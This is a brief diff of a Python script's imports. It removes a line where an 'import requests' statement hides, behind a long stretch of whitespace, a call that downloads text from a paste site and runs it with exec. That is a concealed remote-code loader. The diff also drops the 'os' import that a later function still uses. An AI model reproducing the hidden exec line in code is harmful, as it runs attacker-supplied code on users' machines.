@@ -1,8 +1,6 @@
 import asyncio
 import aiohttp
-import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
-from colorama import Style, Fore
-import os
+import requests                                                                                                                                                                                                                                                                                                                     
 
 def clear():
     os.system("cls" if os.name == "nt" else "clear")
